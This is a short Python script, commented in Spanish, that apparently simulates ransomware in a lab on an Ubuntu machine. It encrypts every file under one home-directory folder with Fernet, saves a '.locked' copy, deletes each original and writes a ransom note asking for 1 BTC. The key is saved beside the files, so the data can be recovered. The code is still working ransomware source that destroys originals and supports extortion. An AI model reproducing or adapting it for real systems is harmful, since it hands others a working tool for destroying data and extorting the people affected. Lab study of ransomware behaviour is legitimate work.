import os
import sys
from cryptography.fernet import Fernet

# 1. Generar la clave de cifrado
key = Fernet.generate_key()
cipher = Fernet(key)

# Definir la ruta objetivo en el Ubuntu
target_dir = "/home/wilf/datos_criticos"

if not os.path.exists(target_dir):
    print(f"[-] Error: La ruta {target_dir} no existe.")
    sys.exit(1)

# NUEVO: Guardar la clave en un archivo dentro de la carpeta para poder recuperarla después
with open(os.path.join(target_dir, "clave.key"), "wb") as key_file:
    key_file.write(key)

print("[*] Iniciando cifrado de archivos...")

# 2. Recorrer la carpeta y cifrar
for root, dirs, files in os.walk(target_dir):
    for file in files:
        if file.endswith('.locked') or file in ['RESCATE.txt', 'clave.key', 'ransomware.py', 'descifrar.py']:
            continue
            
        file_path = os.path.join(root, file)
        
        try:
            with open(file_path, 'rb') as f:
                contenido_original = f.read()
            
            contenido_cifrado = cipher.encrypt(contenido_original)
            
            with open(file_path + '.locked', 'wb') as f:
                f.write(contenido_cifrado)
            
            os.remove(file_path)
            print(f"[+] Archivo cifrado: {file}")
            
        except Exception as e:
            print(f"[-] Error en {file}: {e}")

# 3. Nota de rescate
with open(os.path.join(target_dir, "RESCATE.txt"), 'w') as f:
    f.write("¡TODOS TUS ARCHIVOS HAN SIDO CIFRADOS!\nEnvia 1 BTC para recuperarlos.\n")

print("[+] Ataque finalizado simulado.")
